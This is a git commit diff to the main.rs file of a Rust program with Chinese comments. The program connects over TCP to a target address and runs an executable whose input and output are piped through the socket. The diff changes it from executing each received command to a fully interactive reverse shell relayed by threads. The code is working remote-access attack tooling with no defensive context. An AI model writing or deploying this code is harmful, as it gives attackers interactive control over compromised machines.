c093b438bedfc73b2e0505c0d8b926f568acbd5f
m0n1b <161561830+m0n1b@users.noreply.github.com>
2024-03-29 01:41:00 +0800

    Update main.rs

--- src/main.rs
+++ src/main.rs
@@ -1,8 +1,8 @@
 use std::env;
-use std::io::{Read, Write};
+use std::io::{self, Read, Write};
 use std::net::TcpStream;
 use std::process::{Command, Stdio};
-use std::str;
+use std::thread;
 
 fn main() {
     // 获取命令行参数
@@ -20,33 +20,54 @@ fn main() {
     if let Ok(mut stream) = TcpStream::connect(target) {
         println!("Connected to {}", target);
 
-        loop {
-            // 接收来自服务器的命令
+        // 创建一个子进程来运行指定的可执行文件
+        let mut child = Command::new(executable_path)
+            .stdin(Stdio::piped())
+            .stdout(Stdio::piped())
+            .stderr(Stdio::piped())
+            .spawn()
+            .expect("Failed to start child process");
+
+        // 获取子进程的stdin、stdout和stderr
+        let child_stdin = child.stdin.as_mut().unwrap();
+        let mut child_stdout = child.stdout.take().unwrap();
+        let mut child_stderr = child.stderr.take().unwrap();
+
+        // 创建一个线程来读取子进程的输出并发送到TCP服务器
+        let mut stream_clone = stream.try_clone().expect("Failed to clone stream");
+        thread::spawn(move || {
             let mut buffer = [0; 1024];
+            loop {
+                let size = child_stdout.read(&mut buffer).unwrap();
+                if size == 0 {
+                    break;
+                }
+                stream_clone.write_all(&buffer[..size]).unwrap();
+            }
+        });
+
+        // 创建一个线程来读取子进程的错误输出并发送到TCP服务器
+        let mut stream_clone = stream.try_clone().expect("Failed to clone stream");
+        thread::spawn(move || {
+            let mut buffer = [0; 1024];
+            loop {
+                let size = child_stderr.read(&mut buffer).unwrap();
+                if size == 0 {
+                    break;
+                }
+                stream_clone.write_all(&buffer[..size]).unwrap();
+            }
+        });
+
+        // 从TCP流中读取数据并写入子进程的stdin
+        let mut buffer = [0; 1024];
+        loop {
             match stream.read(&mut buffer) {
                 Ok(size) => {
                     if size == 0 {
-                        // 连接关闭
                         break;
                     }
-                    let command = str::from_utf8(&buffer[..size]).unwrap();
-
-                    // 执行命令并捕获输出
-                    let output = Command::new(executable_path)
-                        .arg(command)
-                        .stdout(Stdio::piped())
-                        .stderr(Stdio::piped())
-                        .output()
-                        .expect("Failed to execute command");
-
-                    // 将命令输出写入TCP流，发送回服务器
-                    if let Ok(stdout) = String::from_utf8(output.stdout) {
-                        stream.write_all(stdout.as_bytes()).unwrap();
-                    }
-
-                    if let Ok(stderr) = String::from_utf8(output.stderr) {
-                        stream.write_all(stderr.as_bytes()).unwrap();
-                    }
+                    child_stdin.write_all(&buffer[..size]).unwrap();
                 }
                 Err(e) => {
                     println!("Error reading from stream: {}", e);
